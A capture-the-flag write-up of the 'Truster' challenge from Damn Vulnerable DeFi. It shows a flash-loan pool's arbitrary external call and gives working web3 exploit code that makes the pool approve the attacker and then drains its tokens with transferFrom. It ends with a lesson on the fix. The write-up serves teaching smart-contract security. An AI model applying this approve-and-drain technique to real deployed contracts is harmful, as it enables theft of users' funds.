# Challenge #3: Truster

This challenge is another one where we have to steal all the Ether from the pool while starting with zero balance. 

No special information is added in the description so we have to analyze the code.

```
function flashLoan(
    uint256 borrowAmount,
    address borrower,
    address target,
    bytes calldata data
)
    external
    nonReentrant
{
    uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
    require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
    
    damnValuableToken.transfer(borrower, borrowAmount);
    (bool success, ) = target.call(data);
    require(success, "External call failed");

    uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
    require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
}
```

The lender pool contract has only one non-reentrant function - *flashLoan*. However, there is one important difference from the other pools here:
1. There are 4 parameters in the function and two of them (*target* and *data*) specify the contract and function which is called by the pool when borrowing the token.
2. Basically, I can make the lender contract to call any function of any contract. 

Can you think of any dangerous contract and function?


## Exploit

Indeed, I can call any function of the token contract. For example, I could call the *transfer* function, but then the loan would not be payed back and the transaction would be reverted. 

However, there is one special function that allows to transfer token later in another transaction. That is the *approve* function. I am going to make the pool approve a future transfer to my address. 

Check out the explit code:

```
/* Get approve transation data for further transfer */
let data = web3.eth.abi.encodeFunctionCall({
    name: 'approve',
    type: 'function',
    inputs: [{
        type: 'address',
        name: 'receiver'
    },{
        type: 'uint256',
        name: 'amount'
    }]
}, [attacker, TOKENS_IN_POOL.toString()]);

/* Borrow token and call approve */
await this.pool.flashLoan(0, attacker, this.token.address, data, { from: attacker });
/* Execute aproved transfer */
await this.token.transferFrom(this.pool.address, attacker, TOKENS_IN_POOL, { from: attacker });
```

1. First we generate the call data parameter in order to call the *approve* function with the address of attacker and the balance of the lender (1000 tokens). 
2. Then, we call the *flashLoan* function without borrowing any token, because we would not be able to return it as we tell the lender to call the function of the token contract that we do not control. 
3. After the flash loan transaction is finished, the token contract allows us to transfer the tokens. Therefore, we call the *transferFrom* function to transfer all tokens from the lender contract to the attacker adddress.

## Lesson learned

This challenge is similar to the previous one, except that here we are attacking the pool, not the receiver.

The lesson learned here is the same - the pool must not allow the borrower to call any function and any contract from the pool's contract. 

The function to be called by the pool must be predefined and if it is possible, a subset of trusted contracts to be called should be defined. Usually, the sender (borrower) contract is the one to be called back.

[<< Back to the README](../README.md)